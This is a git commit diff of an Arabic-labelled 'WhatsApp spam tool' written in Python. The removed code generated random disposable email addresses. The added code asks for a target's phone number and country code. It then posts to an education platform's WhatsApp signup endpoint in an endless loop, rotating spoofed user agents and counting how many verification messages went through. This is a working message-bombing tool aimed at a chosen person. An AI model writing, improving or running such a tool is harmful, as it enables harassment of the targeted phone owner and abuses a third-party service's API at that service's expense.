9c401192cc3b678b91f873ded06819628431f5d9
المطور إبراهيم | • 𝑷𝒚𝒕𝒉𝒐𝒏 • <mesa14719@gmail.com>
2026-09-08 00:50:44 +0100

    Update اداة سبام وتساب.py

--- اداة سبام وتساب.py
+++ اداة سبام وتساب.py
@@ -1,68 +1,81 @@
 
-import os,sys
-import random,string
+import requests,json,os
+from user_agent import generate_user_agent
 from time import sleep
+
 
 R = '\x1b[38;5;1m'   # أحمر
 M = '\x1b[38;5;244m' # رمادي 
 L = '\x1b[38;5;10m' #اخضر 
 
-print(f"{L}={M}="*30)
-
-print(
-	
-	f"{L}  [1] {R} ==> {L} yopmail.com\n"
-	f"{M}{'='*60}\n"
-	f"{L}  [2] {R} ==> {L} hi2.in\n"
-	f"{M}{'='*60}\n"
-	f"{L}  [3] {R} ==> {L} hotmail.com\n"
-	f"{M}{'='*60}\n"
-	f"{L}  [4] {R} ==> {L} gmail.com\n"
-	f"{M}{'='*60}\n"
-	f"{L}  [5] {R} ==> {L} telegmail.com\n"
-	f"{M}{'='*60}\n"
-	f"{L}  [6] {R} ==> {L} yahoo.com\n"
-	
-)
-
-print(f"{L}={M}="*30)
-
-choice =input(f"{L} [{M} Enter choice {L}] >> {M}")
-
-if not choice:
-	print(R+"  لازمك تختار الدومين   ")
-	sys.exit()
 
 
-if choice == "1":
-	domain = "@yopmail.com"
-elif choice == "2":
-	domain = "@hi2.in"
-elif choice == "3":
-	domain = "@hotmail.com"
-elif choice == "4":
-	domain = "@gmail.com"
-elif choice == "5":
-	domain = "@telegmail.com"
-elif choice == "6":
-	domain = "@yahoo.com"
+contt = 0
+OK = 0
+BAD = 0
 
-else:
-	print(R+" اختياركك غاللط ❌")
-	sys.exit()
+contry = input(' Enter contre (DZ) :').strip()
 
-i = int(input(f"{L}  [ {M} How emails want ? {L}] {L} >>"))	
-		
+os.system("clear")
 
-ibra = "qwertyuioplkjhgfdsamnbvcxz1234567890"
-len = random.randint(2,8)
+phone = input(" Enter number phone :").strip()
 
-with open("/storage/emulated/0/Download/domain_email.txt", "w") as f:
-	for _ in range(i):
-		user ="".join(random.choice(ibra) for _ in range(len))
-		email = f"{user}{domain}\n"
-		f.write(email)
+os.system("clear")
+
+cod = input(' Enter cood contre (+) :').strip()
+
+
+sleep(3)
+
+
+ful = f"+{cod}{phone}"
+
+
+os.system("clear")
+
+sleep(1)
+
+
+while True:
+	contt += 1
+
+	url = "https://gw.abgateway.com/student/whatsapp/signup"
+	        
 	
 	
-print(f" 'domain_email.txt' تم حفظ في ملف اسمه")
 	
+	headers = {
+	            'User-Agent': str(generate_user_agent()),
+	            'Accept': "application/json",
+	            'Content-Type': "application/json",
+	            'x-trace-id': "guest_user:ec71bc1f-7bf7-490a-b0dc-dad31e7f31d7",
+	            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+	            'sec-ch-ua-mobile': "?1",
+	            'access-control-allow-origin': "*",
+	            'platform': "web",
+	            'sec-ch-ua-platform': '"Android"',
+	            'origin': "https://abwaab.com",
+	            'sec-fetch-site': "cross-site",
+	            'sec-fetch-mode': "cors",
+	            'sec-fetch-dest': "empty",
+	            'referer': "https://abwaab.com/",
+	            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+	            'priority': "u=1, i"
+	        }
+	payload = {
+	            "language": "ar",
+	            "password": "Abc123456",
+	            "phone": ful,
+	            "country": contry,
+	            "country_code": cod,
+	            "platform": "web"
+	        }
+	        
+	response = requests.post(url, data=json.dumps(payload), headers=headers,timeout=5).text
+	
+	if 'sms_otp_code_sent_succ' in response:
+	    OK += 1
+	else:
+	    BAD += 1
+	    
+	print(f"\r {L} success : {OK} | {R} Faild : {BAD} : {ful} ",end="")
